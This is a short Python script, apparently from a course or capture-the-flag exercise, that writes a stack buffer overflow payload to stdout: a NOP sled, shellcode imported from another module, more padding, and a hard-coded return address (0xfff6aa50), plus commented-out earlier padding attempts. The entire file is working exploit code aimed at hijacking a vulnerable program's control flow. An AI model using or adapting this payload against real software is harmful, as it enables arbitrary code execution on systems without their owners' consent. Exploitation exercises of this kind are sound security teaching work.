from shellcode import shellcode
import sys
nops = (0x90).to_bytes(1, 'little')
sys.stdout.buffer.write(nops * 256)
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(nops * 727)
return_addr = (0xfff6aa50).to_bytes(4, 'little')
sys.stdout.buffer.write(return_addr)
# fff6aa50
# offset = b'A' * 1024
# sys.stdout.buffer.write(offset)
# blanks = b"\FF" * 956
# sys.stdout.buffer.write(shellcode + blanks)